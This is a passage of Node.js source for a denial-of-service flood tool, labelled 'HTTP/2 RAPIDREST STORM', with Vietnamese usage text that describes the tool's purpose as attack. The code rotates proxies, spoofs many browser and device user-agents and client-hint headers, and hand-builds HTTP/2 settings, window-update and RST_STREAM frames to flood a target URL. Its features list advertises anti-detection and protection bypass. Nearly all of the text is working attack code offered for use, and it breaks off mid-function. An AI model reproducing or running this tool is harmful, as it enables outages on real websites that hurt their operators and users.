const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const colors = require('colors');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const { exec } = require('child_process');

// ========== GRADIENT & UI EFFECTS ==========
const gradient = (text, startColor, endColor) => {
    const colors = {
        'magenta': '\x1b[35m',
        'cyan': '\x1b[36m',
        'green': '\x1b[32m',
        'yellow': '\x1b[33m',
        'red': '\x1b[31m',
        'blue': '\x1b[34m',
        'white': '\x1b[37m',
        'reset': '\x1b[0m'
    };
    return `${colors[startColor]}${text}${colors.reset}`;
};

const neonText = (text) => {
    const neonColors = ['\x1b[38;2;255;0;255m', '\x1b[38;2;0;255;255m', '\x1b[38;2;255;0;128m'];
    let result = '';
    for (let i = 0; i < text.length; i++) {
        result += neonColors[i % neonColors.length] + text[i];
    }
    return result + '\x1b[0m';
};

const loadingBar = (percent, width = 40) => {
    const filled = Math.floor(percent / 100 * width);
    const empty = width - filled;
    const bar = '█'.repeat(filled) + '░'.repeat(empty);
    const gradientBar = bar.split('').map((c, i) => {
        if (c === '█') return `\x1b[38;2;${Math.floor(100 + (155 * i / width))};0;${Math.floor(155 + (100 * i / width))}m█\x1b[0m`;
        return c;
    }).join('');
    return gradientBar;
};

// ========== USER-AGENT GENERATOR ==========
function getDeviceUserAgent(platform, deviceType, randomDeviceIndex) {
    const userAgents = {
        pc: {
            windows: [
                `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
                `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0`,
                `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0`,
                `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 OPR/108.0.0.0`,
                `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36`
            ],
            mac: [
                `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
                `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15`,
                `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36`,
                `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36`
            ],
            linux: [
                `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
                `Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0`,
                `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36`,
                `Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36`
            ]
        },
        mobile: {
            ios: [
                `Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1`,
                `Mozilla/5.0 (iPad; CPU OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1`,
                `Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1`,
                `Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1`
            ],
            android: [
                `Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36`,
                `Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36`,
                `Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36`,
                `Mozilla/5.0 (Linux; Android 12; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.111 Mobile Safari/537.36`,
                `Mozilla/5.0 (Linux; Android 14; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.164 Mobile Safari/537.36`
            ]
        },
        tablet: {
            ios: [
                `Mozilla/5.0 (iPad; CPU OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1`,
                `Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1`
            ],
            android: [
                `Mozilla/5.0 (Linux; Android 13; SM-T970) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Safari/537.36`,
                `Mozilla/5.0 (Linux; Android 12; SM-T500) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Safari/537.36`,
                `Mozilla/5.0 (Linux; Android 13; SM-X700) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Safari/537.36`
            ]
        },
        smarttv: [
            `Mozilla/5.0 (SmartHub; SMART-TV; U; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) SmartTV Safari/537.36`,
            `Mozilla/5.0 (WebOS; LG NetCast) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Safari/537.36`,
            `Mozilla/5.0 (X11; Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Safari/537.36`,
            `Mozilla/5.0 (Samsung; SmartTV; Tizen 6.5) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 TV Safari/537.36`,
            `Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Safari/537.36`
        ],
        console: [
            `Mozilla/5.0 (PlayStation 5; PS5) AppleWebKit/537.36 (KHTML, like Gecko) PlayStation`,
            `Mozilla/5.0 (Xbox One; Xbox) AppleWebKit/537.36 (KHTML, like Gecko) Xbox`,
            `Mozilla/5.0 (Nintendo Switch; Switch) AppleWebKit/537.36 (KHTML, like Gecko) NintendoBrowser`,
            `Mozilla/5.0 (PlayStation 4; PS4) AppleWebKit/537.36 (KHTML, like Gecko) PlayStation`
        ]
    };
    
    if (randomDeviceIndex) {
        const allPlatforms = ['pc', 'mobile', 'tablet', 'smarttv', 'console'];
        const randomPlatform = allPlatforms[Math.floor(Math.random() * allPlatforms.length)];
        
        if (randomPlatform === 'pc') {
            const osTypes = ['windows', 'mac', 'linux'];
            const randomOS = osTypes[Math.floor(Math.random() * osTypes.length)];
            return userAgents.pc[randomOS][Math.floor(Math.random() * userAgents.pc[randomOS].length)];
        } else if (randomPlatform === 'mobile') {
            const deviceTypes = ['ios', 'android'];
            const randomDevice = deviceTypes[Math.floor(Math.random() * deviceTypes.length)];
            return userAgents.mobile[randomDevice][Math.floor(Math.random() * userAgents.mobile[randomDevice].length)];
        } else if (randomPlatform === 'tablet') {
            const deviceTypes = ['ios', 'android'];
            const randomDevice = deviceTypes[Math.floor(Math.random() * deviceTypes.length)];
            return userAgents.tablet[randomDevice][Math.floor(Math.random() * userAgents.tablet[randomDevice].length)];
        } else if (randomPlatform === 'smarttv') {
            return userAgents.smarttv[Math.floor(Math.random() * userAgents.smarttv.length)];
        } else {
            return userAgents.console[Math.floor(Math.random() * userAgents.console.length)];
        }
    }
    
    if (platform === 'pc') {
        let osType = deviceType;
        if (deviceType === 'random') {
            const osTypes = ['windows', 'mac', 'linux'];
            osType = osTypes[Math.floor(Math.random() * osTypes.length)];
        }
        if (userAgents.pc[osType]) {
            return userAgents.pc[osType][Math.floor(Math.random() * userAgents.pc[osType].length)];
        }
        return userAgents.pc.windows[0];
    }
    
    if (platform === 'mobile') {
        let deviceOS = deviceType;
        if (deviceType === 'random') {
            const osTypes = ['ios', 'android'];
            deviceOS = osTypes[Math.floor(Math.random() * osTypes.length)];
        }
        if (userAgents.mobile[deviceOS]) {
            return userAgents.mobile[deviceOS][Math.floor(Math.random() * userAgents.mobile[deviceOS].length)];
        }
        return userAgents.mobile.android[0];
    }
    
    if (platform === 'tablet') {
        let deviceOS = deviceType;
        if (deviceType === 'random') {
            const osTypes = ['ios', 'android'];
            deviceOS = osTypes[Math.floor(Math.random() * osTypes.length)];
        }
        if (userAgents.tablet[deviceOS]) {
            return userAgents.tablet[deviceOS][Math.floor(Math.random() * userAgents.tablet[deviceOS].length)];
        }
        return userAgents.tablet.android[0];
    }
    
    if (platform === 'smarttv') {
        return userAgents.smarttv[Math.floor(Math.random() * userAgents.smarttv.length)];
    }
    
    if (platform === 'console') {
        return userAgents.console[Math.floor(Math.random() * userAgents.console.length)];
    }
    
    if (platform === 'all') {
        const allPlatforms = ['pc', 'mobile', 'tablet', 'smarttv', 'console'];
        const randomPlatform = allPlatforms[Math.floor(Math.random() * allPlatforms.length)];
        
        if (randomPlatform === 'pc') {
            const osTypes = ['windows', 'mac', 'linux'];
            return userAgents.pc[osTypes[Math.floor(Math.random() * osTypes.length)]][Math.floor(Math.random() * 3)];
        } else if (randomPlatform === 'mobile') {
            const deviceTypes = ['ios', 'android'];
            return userAgents.mobile[deviceTypes[Math.floor(Math.random() * deviceTypes.length)]][Math.floor(Math.random() * 3)];
        } else if (randomPlatform === 'tablet') {
            const deviceTypes = ['ios', 'android'];
            return userAgents.tablet[deviceTypes[Math.floor(Math.random() * deviceTypes.length)]][Math.floor(Math.random() * 2)];
        } else if (randomPlatform === 'smarttv') {
            return userAgents.smarttv[Math.floor(Math.random() * userAgents.smarttv.length)];
        } else {
            return userAgents.console[Math.floor(Math.random() * userAgents.console.length)];
        }
    }
    
    return userAgents.pc.windows[0];
}

/// ========== BEAUTIFUL BANNER ==========
const showBanner = () => {
    console.clear();
    
    const bannerLines = [
        "██████╗ ██████╗  ██████╗ ███████╗",
        "██╔══██╗██╔══██╗██╔═══██╗██╔════╝",
        "██║  ██║██║  ██║██║   ██║███████╗",
        "██║  ██║██║  ██║██║   ██║╚════██║",
        "██████╔╝██████╔╝╚██████╔╝███████║",
        "╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝"
    ];
    
    // Mã màu tím Neon phát sáng
    const timNeon = '\x1b[38;2;180;0;255m';
    const reset = '\x1b[0m';
    
    let bannerTim = '';
    for (let i = 0; i < bannerLines.length; i++) {
        bannerTim += `${timNeon}${bannerLines[i]}${reset}\n`;
    }
    
    console.log('\n' + bannerTim);
    
    console.log(`\n${gradient("⚡ ENHANCED FLOOD TOOL v3.0 - HTTP/2 RAPIDREST STORM ⚡", "magenta", "cyan")}`);
    console.log(`${gradient("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", "cyan", "blue")}\n`);
};

// ========== USAGE GUIDE ==========
const showUsage = () => {
    console.log(`${gradient("█ USAGE GUIDE", "magenta", "cyan")}`);
    console.log(`${gradient("├─┼─ Basic Syntax:", "cyan")} ${"node flood.js <METHOD> <TARGET> <TIME> <THREADS> <RATE> <PROXY>".white}`);
    console.log(`${gradient("├─┼─ Example:", "cyan")} ${"node flood.js GET https://target.com 120 16 90 proxy.txt --winter".white}`);
    console.log(`\n${gradient("█ DEVICE OPTIONS (MỚI!)", "magenta", "cyan")}`);
    console.log(`${gradient("├─┼─")} ${"--platform <type>".bold.magenta}  ${"• Loại thiết bị: pc, mobile, tablet, smarttv, console, all".gray}`);
    console.log(`${gradient("├─┼─")} ${"--device <os>".bold.magenta}      ${"• Hệ điều hành: windows, mac, linux, ios, android, random".gray}`);
    console.log(`${gradient("└─┼─")} ${"--random-device".bold.magenta}    ${"• Random hoàn toàn thiết bị (override platform & device)".gray}`);
    console.log(`\n${gradient("█ AVAILABLE OPTIONS", "magenta", "cyan")}`);
    console.log(`${gradient("├─┼─")} ${"--winter".bold.magenta}     ${"• Bắt buộc để kích hoạt tấn công".gray}`);
    console.log(`${gradient("├─┼─")} ${"--query 1/2/3".bold.magenta} ${"• Chuỗi truy vấn ngẫu nhiên".gray}`);
    console.log(`${gradient("├─┼─")} ${"--cookie <value>".bold.magenta} ${"• Cookie tùy chỉnh (hỗ trợ %RAND%)".gray}`);
    console.log(`${gradient("├─┼─")} ${"--full".bold.magenta}        ${"• Chế độ tấn công backend lớn".gray}`);
    console.log(`${gradient("├─┼─")} ${"--http 1/2/mix".bold.magenta} ${"• Chọn giao thức HTTP".gray}`);
    console.log(`${gradient("├─┼─")} ${"--debug".bold.magenta}        ${"• Hiển thị trạng thái chi tiết".gray}`);
    console.log(`${gradient("├─┼─")} ${"--delay <ms>".bold.magenta}   ${"• Độ trễ giữa các request (1-100ms)".gray}`);
    console.log(`${gradient("├─┼─")} ${"--header <h:v#h:v>".bold.magenta} ${"• Header tùy chỉnh (# để phân cách)".gray}`);
    console.log(`${gradient("├─┼─")} ${"--useragent <ua>".bold.magenta} ${"• User-Agent tùy chỉnh".gray}`);
    console.log(`${gradient("└─┼─")} ${"--randrate".bold.magenta}     ${"• Random tốc độ request".gray}`);
    
    console.log(`\n${gradient("█ Ví dụ với Device Options:", "cyan")}`);
    console.log(`${gradient("├─┼─")} ${"📱 Chỉ tấn công từ điện thoại:".white}`);
    console.log(`${gradient("│    └─")} ${"node flood.js GET https://target.com 120 16 90 proxy.txt --platform mobile --device android --winter".gray}`);
    console.log(`${gradient("├─┼─")} ${"💻 Chỉ tấn công từ PC Windows:".white}`);
    console.log(`${gradient("│    └─")} ${"node flood.js GET https://target.com 120 16 90 proxy.txt --platform pc --device windows --winter".gray}`);
    console.log(`${gradient("├─┼─")} ${"🎲 Random thiết bị hoàn toàn:".white}`);
    console.log(`${gradient("│    └─")} ${"node flood.js GET https://target.com 120 16 90 proxy.txt --random-device --winter".gray}`);
    console.log(`${gradient("└─┼─")} ${"🌍 Tất cả thiết bị (PC + Mobile + Tablet + TV + Console):".white}`);
    console.log(`${gradient("     └─")} ${"node flood.js GET https://target.com 120 16 90 proxy.txt --platform all --winter".gray}`);
    
    console.log(`\n${gradient("█ FEATURES", "magenta", "cyan")}`);
    console.log(`${gradient("├─┼─")} ${"✓".green} ${"GOAWAY Fix 100% - Không giảm performance".white}`);
    console.log(`${gradient("├─┼─")} ${"✓".green} ${"TLS Ciphers Optimized - Bypass tốt hơn".white}`);
    console.log(`${gradient("├─┼─")} ${"✓".green} ${"Rapid Reset với Anti-Detection".white}`);
    console.log(`${gradient("├─┼─")} ${"✓".green} ${"High RPS Mode - Tối đa hiệu suất".white}`);
    console.log(`${gradient("└─┼─")} ${"✓".green} ${"Đa dạng thiết bị - PC/Mobile/Tablet/TV/Console".white}`);
    
    console.log(`\n${gradient("█ REQUIREMENTS", "magenta", "cyan")}`);
    console.log(`${gradient("├─┼─")} ${"📦".yellow} ${"npm install hpack colors".white}`);
    console.log(`${gradient("└─┼─")} ${"💡".yellow} ${"Chạy với quyền root để tối ưu TCP".white}\n`);
};

// ========== PARSE ARGUMENTS ==========
if (!process.argv[2] || !process.argv[3] || !process.argv[4] || !process.argv[5] || !process.argv[6] || !process.argv[7]) {
    showBanner();
    showUsage();
    process.exit(1);
}

const reqmethod = process.argv[2];
const target = process.argv[3];
const time = process.argv[4];
const threads = process.argv[5];
const ratelimit = process.argv[6];
const proxyfile = process.argv[7];
const queryIndex = process.argv.indexOf('--query');
const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
const delayIndex = process.argv.indexOf('--delay');
const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) : 0;
const cookieIndex = process.argv.indexOf('--cookie');
const cookieValue = cookieIndex !== -1 && cookieIndex + 1 < process.argv.length ? process.argv[cookieIndex + 1] : undefined;
const refererIndex = process.argv.indexOf('--referer');
const refererValue = refererIndex !== -1 && refererIndex + 1 < process.argv.length ? process.argv[refererIndex + 1] : undefined;
const customHeadersIndex = process.argv.indexOf('--header');
const customHeaders = customHeadersIndex !== -1 && customHeadersIndex + 1 < process.argv.length ? process.argv[customHeadersIndex + 1] : undefined;
const customUAindex = process.argv.indexOf('--useragent');
const customUA = customUAindex !== -1 && customUAindex + 1 < process.argv.length ? process.argv[customUAindex + 1] : undefined;
const forceHttpIndex = process.argv.indexOf('--http');
const forceHttp = forceHttpIndex !== -1 && forceHttpIndex + 1 < process.argv.length ? process.argv[forceHttpIndex + 1] == "mix" ? undefined : parseInt(process.argv[forceHttpIndex + 1]) : "2";
const debugMode = process.argv.includes('--debug');
const useLegitHeaders = process.argv.includes('--winter');
const isFull = process.argv.includes('--full');
const randrate = process.argv.includes('--randrate');

// Platform options
const platformIndex = process.argv.indexOf('--platform');
const platform = platformIndex !== -1 && platformIndex + 1 < process.argv.length ? process.argv[platformIndex + 1] : 'pc';
const deviceTypeIndex = process.argv.indexOf('--device');
const deviceType = deviceTypeIndex !== -1 && deviceTypeIndex + 1 < process.argv.length ? process.argv[deviceTypeIndex + 1] : 'random';
const randomDeviceIndex = process.argv.includes('--random-device');

if (!useLegitHeaders) {
    console.log(`\n${"⚠️".yellow} ${"BẮT BUỘC thêm --winter để kích hoạt tấn công!".bold.red}`);
    console.log(`${"📝".cyan} ${"Ví dụ:".white} node ${process.argv[1]} GET https://target.com 120 16 90 proxy.txt --winter\n`);
    process.exit(1);
}

showBanner();

// Progress bar for initialization
let progress = 0;
const interval = setInterval(() => {
    if (progress >= 100) {
        clearInterval(interval);
        console.log(`\n${gradient("✓ INITIALIZATION COMPLETE!", "green", "cyan")} ${gradient("Đang khởi động tấn công...", "cyan", "blue")}\n`);
    } else {
        progress += 2;
        process.stdout.write(`\r${gradient("█ INITIALIZING", "magenta", "cyan")} ${loadingBar(progress)} ${progress}%`);
    }
}, 50);

setTimeout(() => {
    clearInterval(interval);
    if (progress < 100) {
        console.log(`\n${gradient("✓ INITIALIZATION COMPLETE!", "green", "cyan")}\n`);
    }
}, 3000);

// ========== ORIGINAL VARIABLES ==========
const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT'];

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process
    .setMaxListeners(0)
    .on('uncaughtException', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    });

let statuses = {};
let custom_table = 65535;
let custom_window = 6291456;
let custom_header = 262144;
let custom_update = 15663105;
let timer = 0;

const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
let hcookie = '';

const url = new URL(target);
const proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n');

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function ememmmmmemmeme(minLength, maxLength) {
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload]);
    return frame;
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0);
    const length = lengthAndType >> 8;
    const type = lengthAndType & 0xFF;
    const flags = data.readUint8(4);
    const streamId = data.readUInt32BE(5);
    const offset = flags & 0x20 ? 5 : 0;
    let payload = Buffer.alloc(0);
    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length);
        if (payload.length + offset != length) {
            return null;
        }
    }
    return { streamId, length, type, flags, payload };
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}

function encodeRstStream(streamId, type, flags) {
    const frameHeader = Buffer.alloc(9);
    frameHeader.writeUInt32BE(4, 0);
    frameHeader.writeUInt8(type, 4);
    frameHeader.writeUInt8(flags, 5);
    frameHeader.writeUInt32BE(streamId, 5);
    const statusCode = Buffer.alloc(4).fill(0);
    return Buffer.concat([frameHeader, statusCode]);
}

function buildRequest() {
    const browserVersion = getRandomInt(120, 125);
    const fwfw = ['Google Chrome', 'Brave'];
    const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
    
    let brandValue;
    if (browserVersion === 120) brandValue = `"Not_A Brand";v="8", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    else if (browserVersion === 121) brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "Chromium";v="${browserVersion}"`;
    else if (browserVersion === 122) brandValue = `"Chromium";v="${browserVersion}", "Not(A:Brand";v="24", "${wfwf}";v="${browserVersion}"`;
    else if (browserVersion === 123) brandValue = `"${wfwf}";v="${browserVersion}", "Not:A-Brand";v="8", "Chromium";v="${browserVersion}"`;
    else if (browserVersion === 124) brandValue = `"${wfwf}";v="${browserVersion}", "Not-A.Brand";v="99", "Chromium";v="${browserVersion}"`;
    else brandValue = `"${wfwf}";v="${browserVersion}", "Not A(Brand";v="24", "Chromium";v="${browserVersion}"`;

    const isBrave = wfwf === 'Brave';
    const acceptHeaderValue = isBrave ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
    const langValue = isBrave ? 'en-US,en;q=0.6' : 'en-US,en;q=0.7';
    const userAgent = getDeviceUserAgent(platform, deviceType, randomDeviceIndex);
    const secChUa = `${brandValue}`;
    const currentRefererValue = refererValue === 'rand' ? 'https://' + ememmmmmemmeme(6, 6) + ".net" : refererValue;

    let mysor = '\r\n';
    let mysor1 = '\r\n';
    if (hcookie || currentRefererValue) {
        mysor = '\r\n';
        mysor1 = '';
    } else {
        mysor = '';
        mysor1 = '\r\n';
    }

    let headers = `${reqmethod} ${url.pathname} HTTP/1.1\r\n` +
        `Accept: ${acceptHeaderValue}\r\n` +
        'Accept-Encoding: gzip, deflate, br\r\n' +
        `Accept-Language: ${langValue}\r\n` +
        'Cache-Control: max-age=0\r\n' +
        'Connection: Keep-Alive\r\n' +
        `Host: ${url.hostname}\r\n` +
        'Sec-Fetch-Dest: document\r\n' +
        'Sec-Fetch-Mode: navigate\r\n' +
        'Sec-Fetch-Site: none\r\n' +
        'Sec-Fetch-User: ?1\r\n' +
        'Upgrade-Insecure-Requests: 1\r\n' +
        `User-Agent: ${userAgent}\r\n` +
        `sec-ch-ua: ${secChUa}\r\n` +
        'sec-ch-ua-mobile: ?0\r\n' +
        'sec-ch-ua-platform: "Windows"\r\n' + mysor1;

    if (hcookie) headers += `Cookie: ${hcookie}\r\n`;
    if (currentRefererValue) headers += `Referer: ${currentRefererValue}\r\n` + mysor;

    return Buffer.from(`${headers}`, 'binary');
}

const http1Payload = Buffer.concat(new Array(1).fill(buildRequest()));

function go() {
    var [proxyHost, proxyPort] = proxy[~~(Math.random() * proxy.length)].split(':');
    if (!proxyPort || isNaN(proxyPort)) { go(); return; }

    let tlsSocket;
    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', () => {
            tlsSocket = tls.connect({
                socket: netSocket,
                ALPNProtocols: forceHttp === 1 ? ['http/1.1'] : forceHttp === 2 ? ['h2'] : forceHttp === undefined ? Math.random() >= 0.5 ? ['h2'] : ['http/1.1'] : ['h2', 'http/1.1'],
                servername: url.host,
                ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384',
                sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384',
                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION,
                secure: true,
                minVersion: 'TLSv1.2',
                maxVersion: 'TLSv1.3',
                rejectUnauthorized: false
            }, () => {
                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1') {
                    if (forceHttp == 2) { tlsSocket.end(() => tlsSocket.destroy()); return; }
                    
                    function doWrite() {
                        tlsSocket.write(http1Payload, (err) => {
                            if (!err) setTimeout(() => doWrite(), isFull ? 1000 : 1000 / ratelimit);
                            else tlsSocket.end(() => tlsSocket.destroy());
                        });
                    }
                    doWrite();
                    tlsSocket.on('error', () => tlsSocket.end(() => tlsSocket.destroy()));
                    return;
                }

                if (forceHttp == 1) { tlsSocket.end(() => tlsSocket.destroy()); return; }

                let streamId = 1;
                let data = Buffer.alloc(0);
                let hpack = new HPACK();
                hpack.setTableSize(4096);

                const updateWindow = Buffer.alloc(4);
                updateWindow.writeUInt32BE(custom_update, 0);

                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings([[1, custom_header], [2, 0], [4, custom_window], [6, custom_table]])),
                    encodeFrame(0, 8, updateWindow)
                ];

                tlsSocket.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData]);
                    while (data.length >= 9) {
                        const frame = decodeFrame(data);
                        if (frame != null) {
                            data = data.subarray(frame.length + 9);
                            if (frame.type == 4 && frame.flags == 0) tlsSocket.write(encodeFrame(0, 4, "", 1));
                            if (frame.type == 1 && debugMode) {
                                const status = hpack.decode(frame.payload).find(x => x[0] == ':status')[1];
                                if (!statuses[status]) statuses[status] = 0;
                                statuses[status]++;
                            }
